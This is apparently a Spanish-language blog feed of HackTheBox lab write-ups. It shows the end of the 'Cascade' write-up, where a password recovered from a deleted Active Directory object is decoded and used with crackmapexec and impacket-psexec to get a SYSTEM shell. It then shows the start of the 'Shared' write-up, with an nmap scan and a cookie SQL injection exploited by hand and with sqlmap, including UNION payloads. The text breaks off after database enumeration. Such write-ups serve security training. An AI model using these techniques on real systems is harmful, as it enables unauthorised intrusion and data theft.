                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
CN                              : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
codePage                        : 0
countryCode                     : 0
Created                         : 1/9/2020 7:30:19 PM
createTimeStamp                 : 1/9/2020 7:30:19 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>CASC-WS1<span class="se">\0</span>ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM<span class="o">}</span>
instanceType                    : 4
isCriticalSystemObject          : False
isDeleted                       : True
LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>Computers,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>lastLogoff                      : 0
lastLogon                       : 0
localPolicyFlags                : 0
logonCount                      : 0
Modified                        : 1/28/2020 6:08:35 PM
modifyTimeStamp                 : 1/28/2020 6:08:35 PM
msDS-LastKnownRDN               : CASC-WS1
Name                            : CASC-WS1
                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : computer
ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
primaryGroupID                  : 515
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132230718192147073
sAMAccountName                  : CASC-WS1<span class="err">$</span>
sDRightsEffective               : 0
userAccountControl              : 4128
uSNChanged                      : 245849
uSNCreated                      : 24603
whenChanged                     : 1/28/2020 6:08:35 PM
whenCreated                     : 1/9/2020 7:30:19 PM

CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
CN                              : Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
Created                         : 1/13/2020 5:21:53 PM
createTimeStamp                 : 1/13/2020 5:21:53 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>Scheduled Tasks<span class="se">\0</span>ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...<span class="o">}</span>
groupType                       : <span class="nt">-2147483644</span>
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Modified                        : 1/28/2020 6:07:55 PM
modifyTimeStamp                 : 1/28/2020 6:07:55 PM
msDS-LastKnownRDN               : Scheduled Tasks
Name                            : Scheduled Tasks
                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : group
ObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131
ProtectedFromAccidentalDeletion : False
sAMAccountName                  : Scheduled Tasks
sDRightsEffective               : 0
uSNChanged                      : 245848
uSNCreated                      : 114790
whenChanged                     : 1/28/2020 6:07:55 PM
whenCreated                     : 1/13/2020 5:21:53 PM

CanonicalName                   : cascade.local/Deleted Objects/<span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
CN                              : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
Created                         : 1/26/2020 2:34:30 AM
createTimeStamp                 : 1/26/2020 2:34:30 AM
Deleted                         : True
Description                     :
DisplayName                     : Block Potato
DistinguishedName               : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/1/1601 12:00:00 AM<span class="o">}</span>
flags                           : 0
gPCFileSysPath                  : <span class="se">\\</span>cascade.local<span class="se">\S</span>ysVol<span class="se">\c</span>ascade.local<span class="se">\P</span>olicies<span class="se">\{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
gPCFunctionalityVersion         : 2
gPCMachineExtensionNames        : <span class="o">[{</span>35378EAC-683F-11D2-A89A-00C04FBBCFA2<span class="o">}{</span>53D6AB1D-2488-11D1-A28C-00C04FB94F17<span class="o">}][{</span>B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A<span class="o">}{</span>53D6AB1D-2488-11D1-A28C-00C04FB94F17<span class="o">}]</span>
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">CN</span><span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
Name                            : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                                  DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : groupPolicyContainer
ObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196701
uSNCreated                      : 196688
versionNumber                   : 2
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:30 AM

CanonicalName                   : cascade.local/Deleted Objects/Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
CN                              : Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
Created                         : 1/26/2020 2:34:31 AM
createTimeStamp                 : 1/26/2020 2:34:31 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>Machine<span class="se">\0</span>ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/1/1601 12:00:00 AM<span class="o">}</span>
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : Machine
Name                            : Machine
                                  DEL:93c23674-e411-400b-bb9f-c0340bda5a34
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196699
uSNCreated                      : 196689
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

CanonicalName                   : cascade.local/Deleted Objects/User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
CN                              : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
Created                         : 1/26/2020 2:34:31 AM
createTimeStamp                 : 1/26/2020 2:34:31 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>User<span class="se">\0</span>ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/1/1601 12:00:00 AM<span class="o">}</span>
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Modified                        : 1/26/2020 2:40:52 AM
modifyTimeStamp                 : 1/26/2020 2:40:52 AM
msDS-LastKnownRDN               : User
Name                            : User
                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : container
ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
ProtectedFromAccidentalDeletion : False
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
uSNChanged                      : 196700
uSNCreated                      : 196690
whenChanged                     : 1/26/2020 2:40:52 AM
whenCreated                     : 1/26/2020 2:34:31 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>dSCorePropagationData           : <span class="o">{</span>1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM<span class="o">}</span>
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
</code></pre></div></div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz</code>.</p>
  </li>
  <li>
    <p>Vemos la contraseña en texto plano.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo </span>YmFDVDNyMWFOMDBkbGVz | <span class="nb">base64</span> <span class="nt">-d</span>
baCT3r1aN00dles
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Comprobamos que son sus credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.10.10.182 <span class="nt">-u</span> administrator <span class="nt">-p</span> baCT3r1aN00dles
SMB         10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span>
HTTP        10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\a</span>dministrator:baCT3r1aN00dles <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Podemos ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-psexec cascade.local/administrator:<span class="s1">'baCT3r1aN00dles'</span>@10.10.10.182
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.182.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file DMBizKaJ.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.182.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service HMRm on 10.10.10.182.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service HMRm.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 6.1.7601]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
144f061bdfde9e97418da481e7228dba
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Shared (medium)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html" rel="alternate" type="text/html" title="HackTheBox - Shared (medium)" /><published>2024-05-26T00:00:00-06:00</published><updated>2024-05-26T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/05/26/shared.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/bf928375e067672d42a572d81684537b.png" />
</p>

<ul>
  <li>Shared is a Medium Difficulty Linux machine that features a Cookie SQL Injection leading to a foothold, which is then used to escalate privileges by reverse engineering a Golang binary and leveraging two CVEs to gain a root shell.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos con el escaneo de puertos y servicios abiertos por el protocolo <strong>TCP</strong> en la maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,443 10.10.11.172 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-26 12:59 CST
Nmap scan report <span class="k">for </span>10.10.11.172
Host is up <span class="o">(</span>0.092s latency<span class="o">)</span><span class="nb">.</span>

PORT	STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 <span class="o">(</span>RSA<span class="o">)</span>
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span><span class="k">*</span>.shared.htb/organizationName<span class="o">=</span>HTB/stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
|_http-title: Did not follow redirect to https://shared.htb
| tls-nextprotoneg:
|   h2
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Ahora agregamos el subdominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.172 shared.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.172 shared.htb
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/1.png" />
</p>

<ul>
  <li>
    <p>Es una tienda vamos agregar una producto al carrito.</p>
  </li>
  <li>
    <p>Si le damos en procesar el pedido vemos que nos redirige a otro subdominio.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/2.png" />
</p>

<ul>
  <li>
    <p>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
  </li>
  <li>
    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Proceed to checkout</code> nos lleva al subdominio.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/3.png" />
</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li>Si ponemos datos cualquiera como input vemos que solo nos dice que el pago se realizo con éxito.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/4.png" />
</p>

<ul>
  <li>Vemos que se están empleando <code class="language-plaintext highlighter-rouge">cookies</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/5.png" />
</p>

<ul>
  <li>Vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">Burpsuite</code> en el momento en el que demos <code class="language-plaintext highlighter-rouge">click</code> ala hora de darle en <code class="language-plaintext highlighter-rouge">proceed to checkout</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/6.png" />
</p>

<ul>
  <li>Si <code class="language-plaintext highlighter-rouge">urldecodiamos</code> la parte de la <code class="language-plaintext highlighter-rouge">cookie</code> vemos los datos que nos muestra a la hora de pagar.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/7.png" />
</p>

<ul>
  <li>Si cambiamos el numero vemos que se refleja.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/8.png" />
</p>

<ul>
  <li>Si aplicamos una inyección <code class="language-plaintext highlighter-rouge">sql</code> para hacer un ordenamiento basándonos en la 3 columna vemos no nos da ningún error.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/9.png" />
</p>

<ul>
  <li>
    <p>Ahora bueno si cambiamos de numero nos da error a si que con esto sabemos que hay 3 columnas con esto ya podemos aplicar un <code class="language-plaintext highlighter-rouge">union select</code> para las 3 columnas, lo que debemos hacer es probar en algún campo para ver si se refleja nuestro output para ver el nombre de la base de datos actualmente en uso.</p>
  </li>
  <li>
    <p>Pero como tal no nos deja hasta que cambiemos la parte del <code class="language-plaintext highlighter-rouge">product</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/10.png" />
</p>

<ul>
  <li>También podemos escribir en el campo 3.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/11.png" />
</p>

<ul>
  <li>Ahora podemos listar las bases de datos existentes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/12.png" />
</p>

<ul>
  <li>Ahora vamos a enumerar las tablas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/13.png" />
</p>

<ul>
  <li>Ahora enumeramos las columnas para la tabla <code class="language-plaintext highlighter-rouge">user</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/14.png" />
</p>

<ul>
  <li>Ahora vemos el contenido de las tablas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/15.png" />
</p>

<ul>
  <li>También lo pudimos haber hecho con <code class="language-plaintext highlighter-rouge">sqlmap</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span>
        ___
       __H__
 ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[)]</span>     | .<span class="s1">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:30:00 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:30:02] <span class="o">[</span>INFO] testing connection to the target URL
<span class="o">[</span>13:30:03] <span class="o">[</span>INFO] checking <span class="k">if </span>the target is protected by some kind of WAF/IPS
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:30:03] <span class="o">[</span>WARNING] heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test </span>shows that <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> might not be injectable
<span class="o">[</span>13:30:04] <span class="o">[</span>INFO] testing <span class="k">for </span>SQL injection on <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span>
<span class="o">[</span>13:30:04] <span class="o">[</span>INFO] testing <span class="s1">'Generic UNION query (NULL) - 3 to 3 columns (custom)'</span>
<span class="o">[</span>13:30:04] <span class="o">[</span>WARNING] applying generic concatenation <span class="o">(</span>CONCAT<span class="o">)</span>
injection not exploitable with NULL values. Do you want to try with a random integer value <span class="k">for </span>option <span class="s1">'--union-char'</span>? <span class="o">[</span>Y/n] Y
<span class="o">[</span>13:30:11] <span class="o">[</span>WARNING] <span class="k">if </span>UNION based SQL injection is not detected, please consider forcing the back-end DBMS <span class="o">(</span>e.g. <span class="s1">'--dbms=mysql'</span><span class="o">)</span>
Deleting temporary files - please <span class="nb">wait</span> ... <span class="k">done</span><span class="nb">.</span>
<span class="o">[</span>13:30:19] <span class="o">[</span>INFO] <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is <span class="s1">'Generic UNION query (NULL) - 3 to 3 columns (custom)'</span> injectable
<span class="o">[</span>13:30:19] <span class="o">[</span>INFO] checking <span class="k">if </span>the injection point on <span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is a <span class="nb">false </span>positive
<span class="o">(</span>custom<span class="o">)</span> HEADER parameter <span class="s1">'Cookie #1*'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 58 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:30:20] <span class="o">[</span>INFO] testing MySQL
<span class="o">[</span>13:30:21] <span class="o">[</span>INFO] confirming MySQL
<span class="o">[</span>13:30:22] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL <span class="o">&gt;=</span> 5.0.0 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:30:22] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/miguel/.local/share/sqlmap/output/checkout.shared.htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 13:30:22 /2024-05-26/
</code></pre></div></div>

<ul>
  <li>Ahora enumeramos las bases de datos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap sqlmap <span class="nt">-u</span> <span class="s2">"https://checkout.shared.htb/"</span> <span class="nt">--cookie</span><span class="o">=</span><span class="s1">'custom_cart={"*":"1"}'</span> <span class="nt">--technique</span> U <span class="nt">--union-cols</span> 3 <span class="nt">--batch</span> <span class="nt">--dbs</span>
        ___
       __H__
 ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.8.3#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span>.]     | .<span class="s1">'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for </span>any misuse or damage caused by this program

<span class="o">[</span><span class="k">*</span><span class="o">]</span> starting @ 13:31:11 /2024-05-26/

custom injection marker <span class="o">(</span><span class="s1">'*'</span><span class="o">)</span> found <span class="k">in </span>option <span class="s1">'--headers/--user-agent/--referer/--cookie'</span><span class="nb">.</span> Do you want to process it? <span class="o">[</span>Y/n/q] Y
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] resuming back-end DBMS <span class="s1">'mysql'</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] testing connection to the target URL
sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
<span class="nt">---</span>
Parameter: Cookie <span class="c">#1* ((custom) HEADER)</span>
    Type: UNION query
    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 4 columns <span class="o">(</span>custom<span class="o">)</span>
    Payload: <span class="nv">custom_cart</span><span class="o">={</span><span class="s2">"' UNION ALL SELECT NULL,CONCAT(CONCAT('qzbxq','mDgXayJoyKUymjwMorkqAOaGsoWQfELOhEkSsvUp'),'qvbkq'),NULL-- qbYb"</span>:<span class="s2">"1"</span><span class="o">}</span>
<span class="nt">---</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>13:31:12] <span class="o">[</span>INFO] fetching database names
<span class="k">do </span>you want to URL encode cookie values <span class="o">(</span>implementation specific<span class="o">)</span>? <span class="o">[</span>Y/n] Y
available databases <span class="o">[</span>2]:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> checkout
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema

